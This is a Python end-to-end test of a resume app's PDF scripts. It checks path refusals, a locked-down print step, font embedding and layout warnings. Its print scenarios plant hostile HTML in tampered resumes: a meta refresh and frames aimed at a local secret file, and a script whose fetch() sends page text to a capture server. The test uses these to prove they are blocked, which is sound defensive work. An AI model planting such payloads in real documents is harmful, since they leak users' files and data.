#!/usr/bin/env python3
"""End-to-end test of the PDF scripts' limits (make-pdf.sh, page-count.sh, make-pdf.ps1), on a throwaway copy of
the app in a temp folder whose path has a space. The real workspace is never touched.

    python3 scripts/ci/e2e-pdf.py [--impl sh|ps|both] [--keep]

Codex may run these scripts outside its sandbox (.codex/rules/job-search-hq.rules), so (review J3-10, J3-11):
- they print only a plain file inside jobs/ (page checks also profile/templates/, pages/, templates/): an address
  (file://...), a ".." part, a link, or a file whose real folder is elsewhere is refused before anything runs;
- the page is printed from a copy with no scripts, frames, objects or <meta refresh>, and with every outside
  request sent nowhere: a page can't phone home or print another file on the computer into the PDF;
- the app's own fonts (files next to the templates) still load and end up in the PDF.
The refusal checks need no browser; the printing checks need Chrome, Edge or Chromium (skipped with a NOTE if
none) and pdftotext/pdffonts for the text and font checks (each skipped with a NOTE if missing).
Also (review J1-05): a pdftotext that writes nothing never lets a blank PDF through under the final name.
"""
import sys; sys.dont_write_bytecode = True  # noqa: E702
import os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from e2e_common import (IS_WINDOWS, Run, keep_temps, make_workspace, parse_args, ps, read, run, sh,  # noqa: E402
                        temp_dir, write)

import http.server  # noqa: E402
import shutil  # noqa: E402
import threading  # noqa: E402

SECRET = "OUTSIDE-SECRET-NEVER-IN-A-PDF"
PERSON = "Alex Rivera"
MAKE_SH = ".claude/skills/tailor-resume/scripts/make-pdf.sh"
COUNT_SH = ".claude/skills/tailor-resume/scripts/page-count.sh"
MAKE_PS = ".claude/skills/tailor-resume/scripts/make-pdf.ps1"


def J(root, r):
    return os.path.join(root, *r.split("/"))


def file_url(p):
    p = os.path.abspath(p).replace("\\", "/")
    return ("file://" if p.startswith("/") else "file:///") + p


def make(impl, ws, src, check_only=False, env=None):
    """make-pdf (or the page check) on src; returns (exit code, output)."""
    if impl == "sh":
        if check_only:
            return sh(J(ws, COUNT_SH), src, cwd=ws, env=env, timeout=180)
        return sh(J(ws, MAKE_SH), src, PERSON, "Acme", cwd=ws, env=env, timeout=180)
    if check_only:
        return ps(J(ws, MAKE_PS), src, "-CheckOnly", cwd=ws, env=env, timeout=180)
    return ps(J(ws, MAKE_PS), src, PERSON, "Acme", cwd=ws, env=env, timeout=180)


def pdfs_under(root):
    found = set()
    for dp, _dn, fn in os.walk(root):
        for f in fn:
            if f.lower().endswith(".pdf"):
                found.add(os.path.join(dp, f))
    return found


def pdf_line(out):
    for line in out.splitlines():
        if line.startswith("pdf: "):
            p = line[5:].strip()
            # Git Bash prints /d/a/...; Python on Windows needs D:/a/...
            if IS_WINDOWS and len(p) > 2 and p[0] == "/" and p[1].isalpha() and p[2] == "/":
                p = p[1].upper() + ":" + p[2:]
            return p
    return None


def can_symlink(base):
    probe = os.path.join(base, "link-probe")
    try:
        os.symlink(base, probe, target_is_directory=True)
        os.unlink(probe)
        return True
    except (OSError, NotImplementedError):
        return False


class Hits(http.server.BaseHTTPRequestHandler):
    seen = []

    def do_GET(self):  # noqa: N802
        Hits.seen.append(self.path)
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"body::after { content: 'FETCHED-FROM-OUTSIDE' }")

    def log_message(self, *_a):
        pass


DOC = """<!doctype html>
<!-- a resume page someone tampered with -->
<html lang="en"><head><meta charset="utf-8"><title>Alex Rivera Resume</title>
%(head)s
<style>@page { size: Letter; margin: 0.5in } body { font-family: Arial, sans-serif }</style>
</head><body>
<h1>Alex Rivera</h1>
<p>Chicago, IL | (555) 555-0100 | alex.rivera@example.com</p>
<h2>Experience</h2><p>Operations Analyst, Acme, 2023 - 2025</p>
%(body)s
<h2>Education</h2><p>BA, Northwind University, 2019</p>
</body></html>
"""


def scenario_refusals(R, impl, base, ws, links_ok):
    tag = "[%s]" % impl
    R.section("%s refused before anything runs (no browser needed)" % impl)
    good = J(ws, "jobs/acme-analyst/resume.html")
    write(good, DOC % {"head": "", "body": ""})
    outside = os.path.join(base, "outside folder")
    write(os.path.join(outside, "resume.html"), DOC % {"head": "", "body": ""})
    before = pdfs_under(base)

    def refused(label, src, check_only=False, want="refused: "):
        rc, out = make(impl, ws, src, check_only)
        R.ok("%s %s %s is refused (%s..., exit 2) and makes no PDF" % (
             tag, "page check:" if check_only else "make-pdf:", label, want.strip()),
             rc == 2 and out.strip().splitlines()[:1] and out.strip().splitlines()[0].startswith(want)
             and pdfs_under(base) == before, "rc=%s\n%s" % (rc, out))

    for co in (False, True):
        rc, out = make(impl, ws, file_url(good), co)
        R.ok("%s %s a file:// address is refused (nothing printed)" % (tag, "page check:" if co else "make-pdf:"),
             rc != 0 and (out.startswith("refused: ") or out.startswith("not-found: "))
             and pdfs_under(base) == before, "rc=%s\n%s" % (rc, out))
        refused('a path with a ".." part', os.path.join("jobs", "..", "jobs", "acme-analyst", "resume.html"), co)
        refused("a file outside the workspace", os.path.join(outside, "resume.html"), co)
    write(J(ws, "profile/templates/resume-template.html"), DOC % {"head": "", "body": ""})
    refused("a file in profile/templates/ (only job folders get a final PDF)", "profile/templates/resume-template.html")
    write(J(ws, "imports/resume.html"), DOC % {"head": "", "body": ""})
    refused("a file in imports/", "imports/resume.html", True)
    if links_ok:
        os.symlink(os.path.join(outside, "resume.html"), J(ws, "jobs/acme-analyst/linked.html"))
        os.symlink(outside, J(ws, "jobs/linked-folder"), target_is_directory=True)
        for co in (False, True):
            refused("a link (shortcut) to a file outside", "jobs/acme-analyst/linked.html", co)
            refused("a file in a linked folder that points outside", os.path.join("jobs", "linked-folder", "resume.html"),
                    co)
    else:
        print("NOTE  %s link refusals not run: this system can't make symlinks without admin rights" % tag)
    rc, out = make(impl, ws, "profile/templates/resume-template.html", True)
    R.ok("%s page check: a template copy in profile/templates/ is allowed" % tag,
         not out.startswith("refused") and rc in (0, 1) and ("pages: " in out or "no-browser" in out), out)


def scenario_print(R, impl, base, ws, have_text, have_fonts):
    tag = "[%s]" % impl
    R.section("%s the printed copy has no scripts, frames or outside requests" % impl)
    rc, out = make(impl, ws, "jobs/acme-analyst/resume.html", True)
    if "no-browser" in out:
        print("NOTE  %s printing checks not run: no Chrome, Edge or Chromium on this computer" % tag)
        return
    R.ok("%s page check of a plain resume works: 'pages: 1'" % tag, rc == 0 and "pages: 1" in out, out)
    secret = os.path.join(base, "secret %s.txt" % impl)
    write(secret, SECRET + "\n")
    srv = http.server.HTTPServer(("127.0.0.1", 0), Hits)
    port = srv.server_address[1]
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    out_url = "http://127.0.0.1:%d" % port
    cases = {
        "meta refresh to another file": ('<meta http-equiv="refresh" content="0; url=%s">' % file_url(secret), ""),
        "a frame and an object showing another file":
            ("", '<iframe src="%s" width="500" height="80"></iframe>\n<object data="%s" type="text/plain" width="500" '
                 'height="80"></object>' % (file_url(secret), file_url(secret))),
        "a script, an image, a stylesheet and a fetch to an outside address":
            ('<link rel="stylesheet" href="%s/style.css">\n<base href="%s/">' % (out_url, out_url),
             '<img src="%s/pixel.png" alt="">\n<script>document.write("SCRIPT-RAN"); fetch("%s/fetch?d=" + '
             'document.body.innerText)</script>' % (out_url, out_url)),
    }
    for i, (label, (head, body)) in enumerate(sorted(cases.items())):
        folder = "jobs/tampered-%d" % i
        write(J(ws, folder + "/resume.html"), DOC % {"head": head, "body": body})
        Hits.seen = []
        rc, out = make(impl, ws, folder + "/resume.html")
        pdf = pdf_line(out)
        R.ok("%s %s: the PDF is still made (exit 0, 'pdf:' line)" % (tag, label), rc == 0 and pdf and os.path.isfile(pdf),
             "rc=%s\n%s" % (rc, out))
        R.ok("%s %s: nothing reached the outside address" % (tag, label), not Hits.seen, "hits: %s" % Hits.seen)
        if have_text and pdf and os.path.isfile(pdf):
            rc2, text = run(["pdftotext", "-enc", "UTF-8", pdf, "-"])
            R.ok("%s %s: the PDF holds the resume and none of the other file, script or outside text" % (tag, label),
                 rc2 == 0 and PERSON in text and SECRET not in text and "SCRIPT-RAN" not in text
                 and "FETCHED-FROM-OUTSIDE" not in text, text)
    srv.shutdown()
    if not have_text:
        print("NOTE  %s PDF text checks not run: no pdftotext" % tag)

    # The app's own fonts still load through the copy (its <base> points at the page's folder).
    src = read(J(ws, "templates/resume-designed-template.html"))
    write(J(ws, "jobs/fonts-check/resume-designed.html"), src)
    rc, out = sh(J(ws, MAKE_SH), "jobs/fonts-check/resume-designed.html", "Your Name", "Acme", cwd=ws, timeout=180) \
        if impl == "sh" else ps(J(ws, MAKE_PS), "jobs/fonts-check/resume-designed.html", "Your Name", "Acme", cwd=ws,
                                timeout=180)
    pdf = pdf_line(out)
    R.ok("%s the designed resume template prints (exit 0, 'pdf:' line)" % tag, rc == 0 and pdf is not None, out)
    if have_fonts and pdf:
        rc2, fonts = run(["pdffonts", pdf])
        R.ok("%s ...with the app's own font files embedded (Bricolage Grotesque from templates/assets/fonts/)" % tag,
             rc2 == 0 and "Bricolage" in fonts, fonts)
    elif not have_fonts:
        print("NOTE  %s embedded-font check not run: no pdffonts" % tag)


def scenario_blank_text(R, impl, base, ws):
    """J1-05: pdftotext present but writing nothing must fall back to the font check, so a blank PDF is never saved
    under the final name."""
    tag = "[%s]" % impl
    R.section("%s a pdftotext that writes nothing" % impl)
    rc, out = make(impl, ws, "jobs/acme-analyst/resume.html", True)
    if "no-browser" in out:
        print("NOTE  %s blank-PDF check not run: no browser" % tag)
        return
    fake = os.path.join(base, "fake tools %s" % impl)
    os.makedirs(fake, exist_ok=True)
    if IS_WINDOWS:
        write(os.path.join(fake, "pdftotext.cmd"), "@echo off\r\nexit /b 0\r\n")
    else:
        write(os.path.join(fake, "pdftotext"), "#!/bin/sh\nexit 0\n")
        os.chmod(os.path.join(fake, "pdftotext"), 0o755)
    write(J(ws, "jobs/blank-page/resume.html"), "<!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\">"
          "<title>Alex Rivera Resume</title></head><body></body></html>\n")
    env = {"PATH": fake + os.pathsep + os.environ.get("PATH", "")}
    rc, out = make(impl, ws, "jobs/blank-page/resume.html", env=env)
    final = J(ws, "jobs/blank-page/Alex-Rivera-Resume-Acme.pdf")
    R.ok("%s a blank page is 'print-failed' and never saved under the final name" % tag,
         rc == 1 and out.startswith("print-failed") and not os.path.exists(final), "rc=%s\n%s" % (rc, out))


def scenario_text_checks(R, impl, ws):
    """The text and layout checks after the PDF is made: unreadable characters (U+FFFD, an icon font's private-use
    symbols) are a parse problem; a last page with a few lines, or a heading alone at the bottom of a page, is a
    layout-warning; a clean one-page resume gets neither."""
    tag = "[%s]" % impl
    R.section("%s text and layout checks on the finished PDF" % impl)
    rc, out = make(impl, ws, "jobs/acme-analyst/resume.html", True)
    if "no-browser" in out:
        print("NOTE  %s text and layout checks not run: no browser" % tag)
        return
    if not shutil.which("pdftotext"):
        print("NOTE  %s text and layout checks not run: no pdftotext" % tag)
        return
    # Forced page breaks keep the cases independent of fonts and margins.
    filler = "".join("<p>Built weekly reporting for the operations team, line %d.</p>\n" % i for i in range(1, 13))
    cases = [
        ("a clean one-page resume", "", "", lambda o: "parse: ok" in o and "layout-warning" not in o),
        # U+FFFD is a glyph with no text behind it; icon fonts' private-use symbols are caught by the same check.
        ("a replacement character before the email", "", "<p>&#xFFFD; alex.rivera@example.com</p>",
         lambda o: "parse: check these:" in o and "unreadable characters" in o),
        ("a second page with two lines on it", "<style>p { margin: 0 } h2:nth-of-type(2) { break-before: page }</style>",
         filler, lambda o: "pages: 2" in o and "the last page holds only 2 lines" in o),
        ("a heading alone at the bottom of page 1", "",
         '<h2 style="break-after: page">Projects</h2>' + filler,
         lambda o: 'heading "Projects" is the last line of page 1' in o),
    ]
    for i, (label, head, body, want) in enumerate(cases):
        folder = "jobs/text-check-%d" % i
        write(J(ws, folder + "/resume.html"), DOC % {"head": head, "body": body})
        rc, out = make(impl, ws, folder + "/resume.html")
        R.ok("%s %s: %s" % (tag, label, "no parse problem or layout-warning" if i == 0 else "reported"),
             rc == 0 and want(out), "rc=%s\n%s" % (rc, out))


def main():
    args = parse_args("End-to-end test of make-pdf / page-count limits and the locked-down print")
    keep_temps(args.keep)
    R = Run("e2e pdf (%s)" % args.impl)
    have_text = shutil.which("pdftotext") is not None
    have_fonts = shutil.which("pdffonts") is not None
    for impl in args.impls:
        base = temp_dir("e2e pdf %s" % impl)
        ws = make_workspace(base)
        links_ok = can_symlink(base)
        scenario_refusals(R, impl, base, ws, links_ok)
        scenario_print(R, impl, base, ws, have_text, have_fonts)
        scenario_blank_text(R, impl, base, ws)
        scenario_text_checks(R, impl, ws)
    R.finish()


if __name__ == "__main__":
    main()
